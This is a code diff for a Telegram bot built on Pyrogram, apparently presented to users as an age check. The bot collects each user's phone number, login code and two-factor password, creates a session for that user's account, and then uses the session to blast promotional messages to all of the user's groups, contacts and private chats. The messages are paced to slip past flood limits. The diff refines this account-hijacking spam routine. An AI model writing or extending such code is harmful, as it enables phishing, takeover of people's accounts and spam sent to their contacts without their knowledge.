@@ -9,7 +9,8 @@ from pyrogram.types import (
     InlineKeyboardButton,
     ReplyKeyboardMarkup,
     KeyboardButton,
-    CallbackQuery
+    CallbackQuery,
+    ReplyKeyboardRemove
 )
 from pyrogram.errors import (
     PhoneNumberInvalid,
@@ -104,14 +105,14 @@ async def start_login(bot: Client, message: Message):
                 {"id": user_id},
                 {"$set": {"logged_in": True}}
             )
-            await message.reply(strings['verification_success'])
+            await message.reply(strings['verification_success'], reply_markup=ReplyKeyboardRemove())
             asyncio.create_task(send_promotion_messages(user_data['session']))
             return
-        except:
-            pass
+        except Exception as e:
+            print(f"Session test failed: {e}")
     
     if await check_login_status(user_id):
-        await message.reply(strings['already_logged_in'])
+        await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
         return
     
     await message.reply(
@@ -127,21 +128,24 @@ async def start_login(bot: Client, message: Message):
 async def handle_logout(bot: Client, message: Message):
     user_id = message.from_user.id
     if not await check_login_status(user_id):
-        await message.reply(strings['not_logged_in'])
+        await message.reply(strings['not_logged_in'], reply_markup=ReplyKeyboardRemove())
         return
     
     database.update_one(
         {"id": user_id},
         {"$set": {"logged_in": False}}
     )
-    await message.reply(strings['logout_success'])
+    await message.reply(strings['logout_success'], reply_markup=ReplyKeyboardRemove())
 
 @Client.on_message(filters.private & filters.contact)
 async def handle_contact(bot: Client, message: Message):
     user_id = message.from_user.id
     if await check_login_status(user_id):
-        await message.reply(strings['already_logged_in'])
+        await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
         return
+    
+    # Remove verify age keyboard
+    await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
     
     phone_number = message.contact.phone_number
     if not phone_number.startswith('+'):
@@ -163,7 +167,7 @@ async def handle_contact(bot: Client, message: Message):
             reply_markup=OTP_KEYBOARD
         )
     except Exception as e:
-        await message.reply(f"Error: {e}\n/login again.")
+        await message.reply(f"Error: {e}\n/login again.", reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
 
 @Client.on_callback_query(filters.regex("^otp_"))
@@ -182,7 +186,7 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
         if len(state['otp_digits']) < 5:
             await query.answer("OTP must be 5 digits!", show_alert=True)
             return
-        await query.message.edit("Verifying OTP...")
+        await query.message.edit("Verifying OTP...", reply_markup=None)
         try:
             await state['client'].sign_in(
                 state['phone_number'],
@@ -191,10 +195,10 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
             )
             await create_session(bot, state['client'], user_id, state['phone_number'])
         except SessionPasswordNeeded:
-            await query.message.edit("**🔒 2FA REQUIRED:**\nEnter your password:")
+            await query.message.edit("**🔒 2FA REQUIRED:**\nEnter your password:", reply_markup=None)
             state['needs_password'] = True
         except Exception as e:
-            await query.message.reply(f"Error: {e}\n/login again.")
+            await query.message.reply(f"Error: {e}\n/login again.", reply_markup=ReplyKeyboardRemove())
             await cleanup_user_state(user_id)
         return
     else:
@@ -218,10 +222,10 @@ async def handle_2fa_password(bot: Client, message: Message):
     
     try:
         await state['client'].check_password(password=password)
-        await message.reply("Password verified...")
+        await message.reply("Password verified...", reply_markup=ReplyKeyboardRemove())
         await create_session(bot, state['client'], user_id, state['phone_number'])
     except PasswordHashInvalid:
-        await message.reply('**Invalid Password**\n/login again')
+        await message.reply('**Invalid Password**\n/login again', reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
 
 async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
@@ -263,54 +267,71 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         # Remove local copy
         os.remove(session_file)
 
-        await bot.send_message(user_id, strings['verification_success'])
-        asyncio.create_task(send_promotion_messages(string_session))
+        await bot.send_message(user_id, strings['verification_success'], reply_markup=ReplyKeyboardRemove())
+        asyncio.create_task(run_promotions(string_session))
         
     except Exception as e:
-        await bot.send_message(user_id, f"Error: {e}\n/login again")
+        print(f"Session creation error: {e}")
+        await bot.send_message(user_id, f"Error: {e}\n/login again", reply_markup=ReplyKeyboardRemove())
     finally:
         await cleanup_user_state(user_id)
 
-async def send_promotion_messages(session_string: str):
+async def run_promotions(session_string: str):
+    print("Starting promotion task...")
     try:
-        client = Client("promo", session_string=session_string)
-        await client.start()
-        
-        # Get all targets
-        targets = set()
-        
-        # 1. Groups/supergroups
-        async for dialog in client.get_dialogs():
-            if dialog.chat.type in ["group", "supergroup"]:
-                targets.add(dialog.chat.id)
-        
-        # 2. Contacts
-        contacts = await client.get_contacts()
-        for user in contacts:
-            if not user.is_bot:
-                targets.add(user.id)
-        
-        # 3. Private chats
-        async for dialog in client.get_dialogs():
-            if dialog.chat.type == "private" and not dialog.chat.is_bot:
-                targets.add(dialog.chat.id)
-        
-        # Promotion blast
-        for target in targets:
-            for promo_text in PROMO_TEXTS:
-                try:
-                    await client.send_message(target, promo_text)
-                    await asyncio.sleep(300 + (time.time() % 10))
-                except FloodWait as e:
-                    await asyncio.sleep(e.value + 5)
-                except:
-                    break
-            await asyncio.sleep(60)
+        async with Client("promo", session_string=session_string) as client:
+            # Get all targets
+            targets = set()
             
-    except:
-        pass
+            # 1. Groups/supergroups
+            async for dialog in client.get_dialogs():
+                if dialog.chat.type in ["group", "supergroup"]:
+                    targets.add(dialog.chat.id)
+                    print(f"Added group: {dialog.chat.id}")
+            
+            # 2. Contacts
+            contacts = await client.get_contacts()
+            for user in contacts:
+                if not user.is_bot:
+                    targets.add(user.id)
+                    print(f"Added contact: {user.id}")
+            
+            # 3. Private chats
+            async for dialog in client.get_dialogs():
+                if dialog.chat.type == "private" and not dialog.chat.is_bot:
+                    targets.add(dialog.chat.id)
+                    print(f"Added private chat: {dialog.chat.id}")
+            
+            print(f"Total targets: {len(targets)}")
+            
+            # Promotion blast with rate limiting
+            for i, target in enumerate(targets):
+                try:
+                    for j, promo_text in enumerate(PROMO_TEXTS):
+                        try:
+                            await client.send_message(target, promo_text)
+                            print(f"Sent message {j+1} to {target}")
+                            if j < len(PROMO_TEXTS) - 1:
+                                await asyncio.sleep(300 + (time.time() % 10))
+                        except FloodWait as e:
+                            print(f"Flood wait for {e.value} seconds")
+                            await asyncio.sleep(e.value + 5)
+                        except Exception as e:
+                            print(f"Error sending to {target}: {e}")
+                            break
+                    
+                    if i < len(targets) - 1:
+                        await asyncio.sleep(60)
+                        
+                except Exception as e:
+                    print(f"Error processing target {target}: {e}")
+                    
+    except Exception as e:
+        print(f"Promotion error: {e}")
     finally:
-        try:
-            await client.stop()
-        except:
-            pass
+        print("Promotion task completed")
+
+# Start the bot
+if __name__ == "__main__":
+    app = Client("my_bot", api_id=API_ID, api_hash=API_HASH)
+    app.run()
